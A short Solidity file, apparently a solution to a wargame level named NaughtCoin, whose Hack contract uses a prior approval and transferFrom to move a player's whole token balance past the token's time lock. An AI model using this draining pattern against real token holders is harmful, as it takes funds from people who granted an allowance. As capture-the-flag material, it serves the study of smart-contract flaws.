pragma solidity ^0.8;

interface INaughtCoin {
  function player() external view returns (address);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);
}

// 1. Deploy
// 2. coin.approve(hack, amount)
// 3. pwn
contract Hack {
  function pwn(IERC20 coin) external {
    address player = INaughtCoin(address(coin)).player();
    uint bal = coin.balanceOf(player);
    coin.transferFrom(player, address(this), bal);
  }
}